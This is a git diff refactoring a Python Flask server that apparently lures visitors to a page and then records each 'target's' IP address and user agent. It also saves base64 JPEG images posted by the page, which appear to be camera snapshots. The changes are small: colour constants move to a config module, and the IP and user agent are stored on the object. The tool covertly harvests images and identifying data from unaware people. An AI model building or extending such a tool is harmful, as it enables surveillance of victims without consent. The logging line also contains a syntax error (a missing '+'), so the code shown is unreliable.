@@ -2,15 +2,10 @@ from random import randint, choice
 from datetime import datetime
 from flask import Flask, render_template, request
 from base64 import b64decode as b64
+from . import config
 import logging
 import click
 import os
-
-YELLOW = '\033[33m'
-GREEN = '\033[32;1m'
-WHITE = '\033[m'
-
-# Main Flask Object
 
 class server:
 	def __init__(self,port,param,page='final.html'):
@@ -18,6 +13,8 @@ class server:
 		self.param = param # For checking if multiple modules were passed or not
 		self.page = page
 		self.conn_num = 0
+		self.UA = ''
+		self.IP = ''
 		self.main()
 
 	def write_target_logs(self, data):
@@ -53,10 +50,10 @@ class server:
 
 		@app.route('/')
 		def home():
-			UA = request.user_agent
-			IP = request.remote_addr
-			self.write_target_logs(str(self.conn_num)+'. 'str(IP)+': '+str(UA)+'\n\n')
-			print(f'\n{self.conn_num+1} [+] {GREEN}INCOMING REQUEST FROM {IP}:- {WHITE}{YELLOW} {UA}{WHITE}\n')
+			self.UA = request.user_agent
+			self.IP = request.remote_addr
+			self.write_target_logs(str(self.conn_num)+'. 'str(self.IP)+': '+str(self.UA)+'\n\n')
+			print(f'\n{self.conn_num+1} [+] {config.GREEN}INCOMING REQUEST FROM {self.IP}:- {config.WHITE}{config.YELLOW} {self.UA}{config.WHITE}\n')
 			self.conn_num+=1
 			return render_template(self.page)
 
@@ -64,7 +61,6 @@ class server:
 		def savepic():
 			if request.method == 'POST':
 				name = '[PIC]_'+datetime.now().strftime('%Y_%m_%d-%H_%M_%S')+'_'+self.GenName()+'.jpeg'
-				print('pic coming')
 				with open(name,'wb') as f:
 					f.write(b64(request.get_json().replace('data:image/jpeg;base64,','')))
 				print('pic saved')
